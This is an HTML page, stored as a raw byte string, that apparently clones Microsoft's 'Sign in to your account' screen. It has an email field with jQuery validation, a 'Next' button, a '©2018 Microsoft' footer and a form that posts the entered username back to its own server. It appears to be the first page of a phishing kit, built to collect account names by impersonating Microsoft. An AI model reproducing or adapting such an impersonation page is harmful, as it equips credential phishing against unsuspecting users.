b'<!doctype html>\r\n<html>\r\n\r\n<head>\r\n\t<meta charset="utf-8">\r\n\t<title>Sign in to your account</title>\r\n\t<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">\r\n\t<link rel="stylesheet" type="text/css" href="css/page-style.css">\r\n\t<!--<link rel="stylesheet" type="text/css" href="css/style.css">-->\r\n\t<!--<link rel="stylesheet" type="text/css" href="css/main.css">-->\r\n\t<script type="text/javascript" src="script/all.js"></script>\r\n\t<script type="text/javascript" src="script/modernizr.js"></script>\r\n\t<script type="text/javascript" src="script/jquery.min.js"></script>\r\n\t<script type="text/javascript">\r\n\t\tfunction isValidEmailAddress( emailAddress ) {\r\n\t\t\tvar pattern = new RegExp( /^(("[\\w-\\s]+")|([\\w-]+(?:\\.[\\w-]+)*)|("[\\w-\\s]+")([\\w-]+(?:\\.[\\w-]+)*))(@((?:[\\w-]+\\.)*\\w[\\w-]{0,66})\\.([a-z]{2,6}(?:\\.[a-z]{2})?)$)|(@\\[?((25[0-5]\\.|2[0-4][0-9]\\.|1[0-9]{2}\\.|[0-9]{1,2}\\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\\]?$)/i );\r\n\t\t\treturn pattern.test( emailAddress );\r\n\t\t};\r\n\r\n\t\t$( function () {\r\n\r\n\t\t\t$( document ).ready( function () {\r\n\t\t\t\t$( "#login-signin" ).click( function () {\r\n\t\t\t\t\t$( \'#loader\' ).show();\r\n\r\n\t\t\t\t\tif ( !isValidEmailAddress( $( \'#login-username\' ).val() ) ) {\r\n\t\t\t\t\t\t$( \'#login-username\' ).addClass( "error" );\r\n\t\t\t\t\t\t$( \'#username-error\' ).show();\r\n\t\t\t\t\t\t$( \'#username-error\' ).text( \'Enter a valid email.\' );\r\n\t\t\t\t\t\t$( \'#loader\' ).hide();\r\n\r\n\t\t\t\t\t\t$( \'#login-username\' ).on( \'input\', function () {\r\n\t\t\t\t\t\t\t$( \'#login-username\' ).removeClass( \'error\' );\r\n\t\t\t\t\t\t\t$( \'#username-error\' ).hide();\r\n\t\t\t\t\t\t} );\r\n\t\t\t\t\t\treturn false;\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t} );\r\n\t\t\t} );\r\n\t\t} );\r\n\t</script>\r\n</head>\r\n\r\n<body>\r\n\t<div class="overlay">\r\n\t\t<div class="login-box">\r\n\t\t\t<img src="data:image/png;base64," alt="logo">\r\n\r\n\r\n\t\t\t<h2 id="title" style="font-weight: 300; font-size: 1.5rem; line-height: 1.75rem;">Sign In</h2>\r\n\t\t\t<div id="loader" class="loader hidden">\r\n\t\t\t\t<div class="circle"></div>\r\n\t\t\t\t<div class="circle"></div>\r\n\t\t\t\t<div class="circle"></div>\r\n\t\t\t\t<div class="circle"></div>\r\n\t\t\t\t<div class="circle"></div>\r\n\t\t\t</div>\r\n\r\n\t\t\t<form action="" method="POST">\r\n\t\t\t<p id="username-error" class="row error hide" role="alert"></p>\r\n\t\t\t\t<input id="login-username" name="username" type="email" placeholder="someone@example.com" value="" autocapitalize="none" autocorrect="off" autofocus>\r\n\t\t\t\t<input id="login-signin" type="submit" name="signin" value="Next">\r\n\t\t\t</form>\r\n\t\t\t<br>\r\n\r\n\t\t\t<div id="group2">\r\n\t\t\t\t<small id="fps"><a href="#" class="fade">Can\'t access your account?</a></small>\r\n\t\t\t\t<br>\r\n\t\t\t\t<br>\r\n\t\t\t</div>\r\n\t\t</div>\r\n\t</div>\r\n\r\n\t<footer>\r\n\t\t<ul>\r\n\t\t\t<li><a href="#">Privacy & cookies</a>\r\n\t\t\t</li>\r\n\t\t\t<li><a href="#">Terms of use</a>\r\n\t\t\t</li>\r\n\t\t\t<li><a>&copy;2018 Microsoft</a>\r\n\t\t\t</li>\r\n\t\t</ul>\r\n\t</footer>\r\n\r\n</body>\r\n\r\n</html>'